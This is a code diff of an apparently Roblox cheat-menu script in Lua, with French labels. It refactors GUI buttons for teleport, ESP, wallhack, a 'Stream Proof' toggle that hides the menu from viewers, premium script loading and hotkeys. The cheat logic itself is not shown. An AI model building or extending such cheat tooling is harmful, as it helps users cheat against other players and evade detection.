-        if callback then btn.MouseButton1Click:Connect(function() callback(btn, statusIcon) end) end
-        return btn, statusIcon
+    local function btn(parent, name, callback)
+        local b = Instance.new("TextButton", parent)
+        b.Size = UDim2.new(1, 0, 0, 42)
+        b.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
+        b.Text = name
+        b.TextColor3 = Color3.fromRGB(200, 200, 220)
+        b.Font = Enum.Font.GothamBold
+        b.TextSize = 13
+        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+        local icon = Instance.new("TextLabel", b)
+        icon.Size = UDim2.new(0, 25, 0, 25)
+        icon.Position = UDim2.new(1, -33, 0.5, -12)
+        icon.BackgroundTransparency = 1
+        icon.Text = "○"
+        icon.TextColor3 = CONFIG.THEME.TextDim
+        icon.Font = Enum.Font.GothamBold
+        icon.TextSize = 16
+        b.MouseEnter:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(50, 50, 70)}, 0.2) end)
+        b.MouseLeave:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}, 0.2) end)
+        if callback then b.MouseButton1Click:Connect(function() callback(b, icon) end) end
+        return b, icon
     end
     
-    local function createLabel(parent, text, color)
-        local label = Instance.new("TextLabel", parent)
-        label.Size = UDim2.new(1, 0, 0, 30)
-        label.BackgroundTransparency = 1
-        label.Text = text
-        label.TextColor3 = color or CONFIG.THEME.Text
-        label.Font = Enum.Font.Gotham
-        label.TextSize = 14
-        label.TextXAlignment = Enum.TextXAlignment.Left
-        label.TextWrapped = true
-        return label
+    local function lbl(parent, text, color)
+        local l = Instance.new("TextLabel", parent)
+        l.Size = UDim2.new(1, 0, 0, 25)
+        l.BackgroundTransparency = 1
+        l.Text = text
+        l.TextColor3 = color or CONFIG.THEME.Accent
+        l.Font = Enum.Font.Gotham
+        l.TextSize = 12
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        return l
     end
     
-    createButton(miscContent, "Téléporter", function(btn, icon)
-        local success, msg = teleportSequence()
-        if success then
-            icon.Text = "✓"
-            icon.TextColor3 = CONFIG.THEME.Success
+    btn(miscTab, "Téléporter", function(b, i)
+        if teleportSequence() then
+            i.Text = "✓"
+            i.TextColor3 = CONFIG.THEME.Success
             task.wait(1)
-            icon.Text = "○"
-            icon.TextColor3 = CONFIG.THEME.TextDim
+            i.Text = "○"
+            i.TextColor3 = CONFIG.THEME.TextDim
         end
     end)
     
-    createButton(miscContent, "Optimizer", function(btn, icon)
+    btn(miscTab, "Optimizer", function(b, i)
         State.optimizerEnabled = not State.optimizerEnabled
         toggleOptimizer(State.optimizerEnabled)
-        if State.optimizerEnabled then
-            icon.Text = "●"
-            icon.TextColor3 = CONFIG.THEME.Accent
-        else
-            icon.Text = "○"
-            icon.TextColor3 = CONFIG.THEME.TextDim
-        end
+        i.Text = State.optimizerEnabled and "●" or "○"
+        i.TextColor3 = State.optimizerEnabled and CONFIG.THEME.Accent or CONFIG.THEME.TextDim
     end)
     
-    createButton(espContent, "ESP", function(btn, icon)
+    btn(miscTab, "Stream Proof", function(b, i)
+        State.streamProofEnabled = not State.streamProofEnabled
+        toggleStreamProof(State.streamProofEnabled)
+        i.Text = State.streamProofEnabled and "●" or "○"
+        i.TextColor3 = State.streamProofEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
+    end)
+    
+    btn(espTab, "ESP", function(b, i)
         State.espEnabled = not State.espEnabled
         toggleESP(State.espEnabled)
-        if State.espEnabled then
-            icon.Text = "●"
-            icon.TextColor3 = CONFIG.THEME.Success
-        else
-            icon.Text = "○"
-            icon.TextColor3 = CONFIG.THEME.TextDim
-        end
+        i.Text = State.espEnabled and "●" or "○"
+        i.TextColor3 = State.espEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
     end)
     
-    createButton(espContent, "Wallhack", function(btn, icon)
+    btn(espTab, "Wallhack", function(b, i)
         State.wallhackEnabled = not State.wallhackEnabled
         toggleWallhack(State.wallhackEnabled)
-        if State.wallhackEnabled then
-            icon.Text = "●"
-            icon.TextColor3 = CONFIG.THEME.Success
-        else
-            icon.Text = "○"
-            icon.TextColor3 = CONFIG.THEME.TextDim
-        end
+        i.Text = State.wallhackEnabled and "●" or "○"
+        i.TextColor3 = State.wallhackEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
     end)
     
-    createLabel(premiumContent, "✨ Scripts Premium", CONFIG.THEME.Premium)
-    createLabel(premiumContent, "Clique pour charger un script", CONFIG.THEME.TextDim)
-    
-    for _, scriptData in ipairs(CONFIG.PREMIUM_SCRIPTS) do
-        createButton(premiumContent, scriptData.emoji .. " " .. scriptData.name, function(btn, icon)
-            loadPremiumScript(scriptData, btn, icon)
-        end)
+    lbl(premTab, "✨ Scripts Premium", CONFIG.THEME.Premium)
+    for _, s in ipairs(CONFIG.PREMIUM_SCRIPTS) do
+        btn(premTab, s.emoji .. " " .. s.name, function(b, i) loadPremiumScript(s, b, i) end)
     end
     
-    createLabel(keyContent, "Raccourcis clavier:", CONFIG.THEME.Accent)
-    createLabel(keyContent, "[T] - Téléporter", CONFIG.THEME.Text)
-    createLabel(keyContent, "[INSERT] - Ouvrir/Fermer", CONFIG.THEME.Text)
+    lbl(keyTab, "Raccourcis:", CONFIG.THEME.Accent)
+    lbl(keyTab, "[T] - Téléporter", CONFIG.THEME.TextDark)
+    lbl(keyTab, "[INSERT] - Ouvrir/Fermer", CONFIG.THEME.TextDark)
+    lbl(keyTab, "[P] - Stream Proof", CONFIG.THEME.TextDark)
     
-    createLabel(infoContent, "Discord:", CONFIG.THEME.Accent)
-    local discordBtn = Instance.new("TextButton", infoContent)
-    discordBtn.Size = UDim2.new(1, 0, 0, 50)
-    discordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-    discordBtn.Text = "discord.gg/invite"
-    discordBtn.TextColor3 = CONFIG.THEME.Text
-    discordBtn.Font = Enum.Font.GothamBold
-    discordBtn.TextSize = 16
-    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)
-    
-    discordBtn.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/aYSxvzeRSR")
-    end)
-    
-    createLabel(infoContent, "Version: 1.0.0", CONFIG.THEME.TextDim)
-    createLabel(infoContent, "Créé par 8v & 6v & 4v", CONFIG.THEME.TextDim)
+    lbl(infoTab, "Discord:", CONFIG.THEME.Accent)
+    local discord = Instance.new("TextButton", infoTab)
+    discord.Size = UDim2.new(1, 0, 0, 40)
+    discord.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+    discord.Text = "discord.gg/invite"
+    discord.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discord.Font = Enum.Font.GothamBold
+    discord.TextSize = 14
+    Instance.new("UICorner", discord).CornerRadius = UDim.new(0, 8)
+    discord.MouseButton1Click:Connect(function() setclipboard("https://discord.gg/invite") end)
+    lbl(infoTab, "Version: 1.0.0", CONFIG.THEME.TextDim)
+    lbl(infoTab, "Créé par 8v & 6v & 4v", CONFIG.THEME.TextDim)
 end
 
-createCategorizedGUI()
+createGUI()
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
     if input.KeyCode == Enum.KeyCode.T then
         teleportSequence()
     elseif input.KeyCode == Enum.KeyCode.Insert then
-        local mainFrame = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("MainFrame")
-        local reopenBtn = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("ReopenButton")
-        if mainFrame and reopenBtn then
+        local main = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("MainFrame")
+        local reopen = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("ReopenButton")
+        if main and reopen then
             State.guiVisible = not State.guiVisible
-            mainFrame.Visible = State.guiVisible
-            reopenBtn.Visible = not State.guiVisible
+            main.Visible = State.guiVisible
+            reopen.Visible = not State.guiVisible
         end
+    elseif input.KeyCode == Enum.KeyCode.P then
+        local gui = PlayerGui:FindFirstChild("MinimalTP_GUI")
+        if gui then gui.Enabled = not gui.Enabled end
     end
 end)
